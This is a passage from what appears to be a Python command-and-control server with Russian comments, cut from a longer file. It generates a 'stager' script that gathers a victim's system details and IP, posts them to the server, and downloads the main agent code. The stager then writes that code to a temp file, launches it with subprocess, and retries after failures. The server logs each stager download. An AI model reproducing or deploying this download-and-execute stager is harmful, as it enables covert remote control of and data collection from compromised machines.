        "python_version": platform.python_version()
    }}
    
    # Получаем IP адрес
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info["ip_address"] = s.getsockname()[0]
        s.close()
    except:
        info["ip_address"] = "127.0.0.1"
    
    return info

# Загружаем и запускаем основного агента
try:
    # Формируем URL для загрузки агента
    url = f"http://{{SERVER_HOST}}:{{SERVER_PORT}}/api/download/agent"
    
    # Создаем POST-запрос с системной информацией
    data = urllib.parse.urlencode({{"system_info": str(get_system_info())}}).encode()
    
    # Устанавливаем заголовок с идентификатором агента
    headers = {{"Agent-ID": agent_id}}
    
    # Отправляем запрос
    req = urllib.request.Request(url, data=data, headers=headers)
    response = urllib.request.urlopen(req)
    
    # Получаем код агента
    agent_code = response.read()
    
    # Сохраняем во временный файл
    import tempfile
    temp_dir = tempfile.gettempdir()
    agent_path = os.path.join(temp_dir, f"agent_{{agent_id}}.py")
    
    with open(agent_path, "wb") as f:
        f.write(agent_code)
    
    # Запускаем агента с параметрами
    import subprocess
    subprocess.Popen([
        sys.executable, 
        agent_path,
        "--server", SERVER_HOST,
        "--port", str(SERVER_PORT),
        "--agent-id", agent_id
    ])
    
except Exception as e:
    # При ошибке пытаемся повторить через некоторое время
    time.sleep(30)
"""
        
        # Логируем событие
        log_event("stager_download", f"Стейджер загружен с {request.remote_addr} (ID: {request_id})")
        
        return stager_code
    except Exception as e:
        logger.error(f"Ошибка при загрузке стейджера: {str(e)}")
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8080) 